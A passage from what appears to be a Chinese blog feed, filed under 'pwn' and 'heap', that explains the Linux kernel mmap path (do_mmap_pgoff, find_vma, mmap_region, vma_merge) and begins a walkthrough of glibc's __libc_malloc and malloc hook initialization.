<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,</div><div class="line">        unsigned long, prot, unsigned long, flags,</div><div class="line">        unsigned long, fd, unsigned long, pgoff)&#123;</div><div class="line"></div><div class="line">    struct file *file = NULL;</div><div class="line">    unsigned long retval = -EBADF;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_ANONYMOUS)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else if (flags &amp; MAP_HUGETLB) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE);</div><div class="line"></div><div class="line">    retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff);</div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>SYSCALL_DEFINE6</code>是个宏定义，就是将系统调用号和函数联系起来，这里其实就是定义了<code>sys_mmap_pgoff</code>函数。根据前面传入的flags，这里直接跳过判断，因此下面主要就是执行<code>vm_mmap_pgoff</code>函数，定义在mm/utils.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long vm_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">    unsigned long len, unsigned long prot,</div><div class="line">    unsigned long flag, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    unsigned long ret;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    unsigned long populate;</div><div class="line"></div><div class="line">    ret = security_mmap_file(file, prot, flag);</div><div class="line">    if (!ret) &#123;</div><div class="line">        down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff,</div><div class="line">                    &amp;populate);</div><div class="line">        up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        if (populate)</div><div class="line">            mm_populate(ret, populate);</div><div class="line">    &#125;</div><div class="line">    return ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获得进程的<code>mm_struct</code>结构，该结构保存了虚拟内存和物理内存的映射关系，<code>security_mmap_file</code>和linux安全有关，这里不关心，因此调用<code>do_mmap_pgoff</code>执行主要的mmap内容，前后加了信号量。<code>do_mmap_pgoff</code>定义在mm/mmap.c中，这里省略了很多不关键的代码，</p>
<h2 id="do-mmap-pgoff"><a href="#do-mmap-pgoff" class="headerlink" title="do_mmap_pgoff"></a>do_mmap_pgoff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">            unsigned long len, unsigned long prot,</div><div class="line">            unsigned long flags, unsigned long pgoff,</div><div class="line">            unsigned long *populate)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    vm_flags_t vm_flags;</div><div class="line">    *populate = 0;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_FIXED))</div><div class="line">        addr = round_hint_to_min(addr);</div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line"></div><div class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</div><div class="line">    vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</div><div class="line">            mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</div><div class="line"></div><div class="line">    if (file) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else &#123;</div><div class="line">        switch (flags &amp; MAP_TYPE) &#123;</div><div class="line">        case MAP_SHARED:</div><div class="line">            ...</div><div class="line">            break;</div><div class="line">        case MAP_PRIVATE:</div><div class="line">            pgoff = addr &gt;&gt; PAGE_SHIFT;</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            return -EINVAL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff);</div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>传入的flags没有<code>MAP_FIXED</code>，表是映射的地址不固定（这里传入的<code>addr</code>为0），由内核分配。接下来通过调用<code>round_hint_to_min</code>和<code>PAGE_ALIGN</code>对地址和长度进行页对齐，并且检查地址是否溢出或者太小。<br>下面调用<code>get_unmapped_area</code>在进程的用户空间里查找已经分配的虚拟内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long get_unmapped_area(struct file *file, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    unsigned long (*get_area)(struct file *, unsigned long,</div><div class="line">                  unsigned long, unsigned long, unsigned long);</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    get_area = current-&gt;mm-&gt;get_unmapped_area;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    addr = get_area(file, addr, len, pgoff, flags);</div><div class="line">    if (IS_ERR_VALUE(addr))</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获取<code>get_area</code>函数指针用来查找用户空间中已经分配的虚拟内存，这里根据mmap的方向可以获取到<code>arch_get_unmapped_area_topdown</code>或者<code>arch_get_unmapped_area</code>两个函数指针，其<code>arch_get_unmapped_area_topdown</code>对应的mmap方向是从高地址往低地址方向扩展的，本章还是分析传统的从低地址往高地址拓展对应的<code>arch_get_unmapped_area</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">arch_get_unmapped_area(struct file *filp, unsigned long addr,</div><div class="line">        unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line">    struct vm_unmapped_area_info info;</div><div class="line">    unsigned long begin, end;</div><div class="line"></div><div class="line">    if (flags &amp; MAP_FIXED)</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (addr) &#123;</div><div class="line">        addr = PAGE_ALIGN(addr);</div><div class="line">        vma = find_vma(mm, addr);</div><div class="line">        if (end - len &gt;= addr &amp;&amp;</div><div class="line">            (!vma || addr + len &lt;= vma-&gt;vm_start))</div><div class="line">            return addr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，如果是固定地址映射，直接返回addr地址。本章分析的不是这种情况，省略的代码和一些随机映射有关，这里省略了不分析。这样就进入了底下的if语句里，对地址对齐后，就调用find_vma查找addr地址开始已经分配出去的虚拟内存vma，最后addr到addr+len这个地址范围内没有虚拟内存，就将地址返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr)</div><div class="line">&#123;</div><div class="line">    struct rb_node *rb_node;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line"></div><div class="line">    vma = vmacache_find(mm, addr);</div><div class="line">    if (likely(vma))</div><div class="line">        return vma;</div><div class="line"></div><div class="line">    rb_node = mm-&gt;mm_rb.rb_node;</div><div class="line">    vma = NULL;</div><div class="line"></div><div class="line">    while (rb_node) &#123;</div><div class="line">        struct vm_area_struct *tmp;</div><div class="line"></div><div class="line">        tmp = rb_entry(rb_node, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            vma = tmp;</div><div class="line">            if (tmp-&gt;vm_start &lt;= addr)</div><div class="line">                break;</div><div class="line">            rb_node = rb_node-&gt;rb_left;</div><div class="line">        &#125; else</div><div class="line">            rb_node = rb_node-&gt;rb_right;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (vma)</div><div class="line">        vmacache_update(addr, vma);</div><div class="line">    return vma;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不往下继续看代码的，简单来说，进程已经分配的虚拟内存保存在一个红黑树中，红黑树简单的作用就是防止一个树结构不平衡，出现某个左子树严重大于右子树的情况。为了加快查找的速度，这里设立了缓存。通过观察while结构，这里就是查找第一个结束地址大于addr的已经分配的虚拟内存，然后返回。</p>
<p>回到<code>do_mmap_pgoff</code>中，<code>calc_vm_prot_bits</code>和<code>calc_vm_flag_bits</code>用来将prot和flags中的标志位转化为vm的标志位，例如prot中的<code>PROT_READ</code>转化为<code>VM_READ</code>，flags中的<code>MAP_GROWSDOWN</code>转化为<code>VM_GROWSDOWN</code>。根据前面prot和flags中的值，这里转化后，<code>vm_flags</code>为<code>VM_READ|VM_WRITE|mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC</code>。最后就调用mmap_region构造一个vma用来保存刚刚获得的虚拟内存。</p>
<h2 id="mmap-region"><a href="#mmap-region" class="headerlink" title="mmap_region"></a>mmap_region</h2><p>为了方便分析和查看，这里对mmap_region代码做了适当的删除和改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">unsigned long mmap_region(struct file *file, unsigned long addr,</div><div class="line">        unsigned long len, vm_flags_t vm_flags, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma, *prev;</div><div class="line">    int error;</div><div class="line">    struct rb_node **rb_link, *rb_parent;</div><div class="line">    unsigned long charged = 0;</div><div class="line"></div><div class="line">    if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    error = -ENOMEM;</div><div class="line">    while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,</div><div class="line">                  &amp;rb_parent)) &#123;</div><div class="line">        if (do_munmap(mm, addr, len))</div><div class="line">            return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    vm_flags |= VM_ACCOUNT;</div><div class="line"></div><div class="line">    vma = vma_merge(mm, prev, addr, addr + len, vm_flags, NULL, file, pgoff,</div><div class="line">            NULL);</div><div class="line">    if (vma)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    vma-&gt;vm_mm = mm;</div><div class="line">    vma-&gt;vm_start = addr;</div><div class="line">    vma-&gt;vm_end = addr + len;</div><div class="line">    vma-&gt;vm_flags = vm_flags;</div><div class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags);</div><div class="line">    vma-&gt;vm_pgoff = pgoff;</div><div class="line">    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);</div><div class="line"></div><div class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">out:</div><div class="line"></div><div class="line">    vm_stat_account(mm, vm_flags, file, len &gt;&gt; PAGE_SHIFT);</div><div class="line">    if (vm_flags &amp; VM_LOCKED) &#123;</div><div class="line">        if (!((vm_flags &amp; VM_SPECIAL) || is_vm_hugetlb_page(vma) ||</div><div class="line">                    vma == get_gate_vma(current-&gt;mm)))</div><div class="line">            mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);</div><div class="line">        else</div><div class="line">            vma-&gt;vm_flags &amp;= ~VM_LOCKED;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (file)</div><div class="line">        uprobe_mmap(vma);</div><div class="line"></div><div class="line">    vma-&gt;vm_flags |= VM_SOFTDIRTY;</div><div class="line"></div><div class="line">    vma_set_page_prot(vma);</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>may_expand_vm</code>用于判断加上即将分配的虚拟内存，是否超过了系统的限制，如果超过了就需要进行相应的操作或者返回错误，这里假设不会超过系统限制，不管它。<br><code>find_vma_links</code>的定义如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">static int find_vma_links(struct mm_struct *mm, unsigned long addr,</div><div class="line">        unsigned long end, struct vm_area_struct **pprev,</div><div class="line">        struct rb_node ***rb_link, struct rb_node **rb_parent)&#123;</div><div class="line"></div><div class="line">    struct rb_node **__rb_link, *__rb_parent, *rb_prev;</div><div class="line"></div><div class="line">    __rb_link = &amp;mm-&gt;mm_rb.rb_node;</div><div class="line">    rb_prev = __rb_parent = NULL;</div><div class="line"></div><div class="line">    while (*__rb_link) &#123;</div><div class="line">        struct vm_area_struct *vma_tmp;</div><div class="line"></div><div class="line">        __rb_parent = *__rb_link;</div><div class="line">        vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (vma_tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            if (vma_tmp-&gt;vm_start &lt; end)</div><div class="line">                return -ENOMEM;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_left;</div><div class="line">        &#125; else &#123;</div><div class="line">            rb_prev = __rb_parent;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    *pprev = NULL;</div><div class="line">    if (rb_prev)</div><div class="line">        *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb);</div><div class="line">    *rb_link = __rb_link;</div><div class="line">    *rb_parent = __rb_parent;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数做了两件事，第一件事是重新检查一遍即将分配的虚拟内存是否已经被使用，主要是其他进程可能在这期间分配了该虚拟内存，第二件事是确定即将插入红黑树中的位置，保存在<code>prev</code>、<code>rb_link</code>和<code>rb_parent</code>中。<code>prev</code>保存了虚拟内存结束地址小于即将分配的虚拟内存开始地址的红黑树节点，<code>rb_link</code>一般为null，<code>rb_parent</code>简单说就是保存了离即将分配的虚拟内存开始地址最近的红黑树节点。</p>
<p>再往下通过vma_merge函数查看是否有虚拟空间可以合并，如果有则合并并返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *vma_merge(struct mm_struct *mm,</div><div class="line">            struct vm_area_struct *prev, unsigned long addr,</div><div class="line">            unsigned long end, unsigned long vm_flags,</div><div class="line">            struct anon_vma *anon_vma, struct file *file,</div><div class="line">            pgoff_t pgoff, struct mempolicy *policy)&#123;</div><div class="line"></div><div class="line">    pgoff_t pglen = (end - addr) &gt;&gt; PAGE_SHIFT;</div><div class="line">    struct vm_area_struct *area, *next;</div><div class="line">    int err;</div><div class="line"></div><div class="line">    if (vm_flags &amp; VM_SPECIAL)</div><div class="line">        return NULL;</div><div class="line"></div><div class="line">    if (prev)</div><div class="line">        next = prev-&gt;vm_next;</div><div class="line">    else</div><div class="line">        next = mm-&gt;mmap;</div><div class="line">    area = next;</div><div class="line">    if (next &amp;&amp; next-&gt;vm_end == end)</div><div class="line">        next = next-&gt;vm_next;</div><div class="line"></div><div class="line">    if (prev &amp;&amp; prev-&gt;vm_end == addr &amp;&amp;</div><div class="line">            mpol_equal(vma_policy(prev), policy) &amp;&amp;</div><div class="line">            can_vma_merge_after(prev, vm_flags,</div><div class="line">                        anon_vma, file, pgoff)) &#123;</div><div class="line"></div><div class="line">        if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">                mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">                can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen) &amp;&amp;</div><div class="line">                is_mergeable_anon_vma(prev-&gt;anon_vma,</div><div class="line">                              next-&gt;anon_vma, NULL)) &#123;</div><div class="line"></div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                next-&gt;vm_end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        &#125; else</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(prev, vm_flags);</div><div class="line">        return prev;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">            mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">            can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen)) &#123;</div><div class="line">        if (prev &amp;&amp; addr &lt; prev-&gt;vm_end)</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                addr, prev-&gt;vm_pgoff, NULL);</div><div class="line">        else                    </div><div class="line">            err = vma_adjust(area, addr, next-&gt;vm_end,</div><div class="line">                next-&gt;vm_pgoff - pglen, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(area, vm_flags);</div><div class="line">        return area;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不详细分析这个函数了，主要通过<code>prev-&gt;vm_end == addr</code>判断即将分配的虚拟内存能否往前合并，通过<code>end == next-&gt;vm_start</code>判断即将分配的虚拟内存能否往后合并。其中，合并函数为<code>vma_adjust</code>。再往下就不分析了。</p>
<p>回到函数中，假设不能合并，就要通过slab构造一个<code>vm_area_struct</code>结构体，并设置相应的信息，slab是linux内核中分配小块内存的框架。然后通过<code>vma_link</code>插入到进程的红黑树中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">static void vma_link(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">            struct vm_area_struct *prev, struct rb_node **rb_link,</div><div class="line">            struct rb_node *rb_parent)&#123;</div><div class="line"></div><div class="line">    __vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">    mm-&gt;map_count++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__vma_link</code>执行实际的插入操作，就是一些红黑树的操作，不往下看了。</p>
<p>回到<code>mmap_region</code>中，最后通过<code>vma_set_page_prot</code>继续设置一些标志位，然后就返回分配到的虚拟内存的起始地址addr了，该返回值一直向上返回，然后退出系统调用，返回到glibc中。<br>到这里简单总结一下MMAP，其实质就是通过mmap在进程的内存管理结构中的红黑树中分配一块没有使用的虚拟内存。</p>
<p>下一章继续往下分析glibc中的<code>_int_malloc</code>函数。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc源码分析——1]]></title>
      <url>/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/</url>
      <content type="html"><![CDATA[<h1 id="malloc源码分析—ptmalloc-init"><a href="#malloc源码分析—ptmalloc-init" class="headerlink" title="malloc源码分析—ptmalloc_init"></a>malloc源码分析—<code>ptmalloc_init</code></h1><p>本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc)</div></pre></td></tr></table></figure>
<p><code>strong_alias</code>是GNU C中的定义，编译器判定这里malloc是<code>__libc_malloc</code>的别名，<code>__libc_malloc</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void * __libc_malloc (size_t bytes)&#123;</div><div class="line"></div><div class="line">    mstate ar_ptr;</div><div class="line">    void *victim;</div><div class="line"></div><div class="line">    void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);</div><div class="line">    if (__builtin_expect (hook != NULL, 0))</div><div class="line">        return (*hook)(bytes, RETURN_ADDRESS (0));</div><div class="line"></div><div class="line">    arena_get (ar_ptr, bytes);</div><div class="line"></div><div class="line">    victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    if (!victim &amp;&amp; ar_ptr != NULL)&#123;</div><div class="line">        LIBC_PROBE (memory_malloc_retry, 1, bytes);</div><div class="line">        ar_ptr = arena_get_retry (ar_ptr, bytes);</div><div class="line">        victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (ar_ptr != NULL)</div><div class="line">        (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);</div><div class="line"></div><div class="line">    return victim;</div><div class="line">&#125;</div><div class="line">libc_hidden_def (__libc_malloc)</div></pre></td></tr></table></figure>
<p>首先看<code>atomic_forced_read</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># define atomic_forced_read(x) \</div><div class="line">  (&#123; __typeof (x) __x; __asm (&quot;&quot; : &quot;=r&quot; (__x) : &quot;0&quot; (x)); __x; &#125;)</div></pre></td></tr></table></figure>
<p><code>__typeof</code>是原始函数的返回类型，后面是一段汇编代码，”0”是零，即%0，引用时不可以加 %，只能input引用output，这里就是原子读，将<code>__malloc_hook</code>的地址放入任意寄存器(r)再取出。<code>__malloc_hook</code>的定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</div></pre></td></tr></table></figure>
<p>weak_variable其实就是，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__attribute__ ((weak))</div></pre></td></tr></table></figure>
<p>和编译器有关，这里不管它。<code>__builtin_expect</code>其实就是告诉编译器if判断语句里大多数情况下的值，这样编译器可以做优化，避免过多的跳转。回到<code>__libc_malloc</code>接下来就是调用<code>malloc_hook_ini</code>进行内存的分配。<br><code>malloc_hook_ini</code>定义在hooks.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">static void * malloc_hook_ini (size_t sz, const void *caller)&#123;</div><div class="line">    __malloc_hook = NULL;</div><div class="line">    ptmalloc_init ();</div><div class="line">    return __libc_malloc (sz);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ptmalloc-init"><a href="#ptmalloc-init" class="headerlink" title="ptmalloc_init"></a>ptmalloc_init</h2><p>ptmalloc_init用来对整个ptmalloc框架进行初始化，定义在arena.c中，</p>
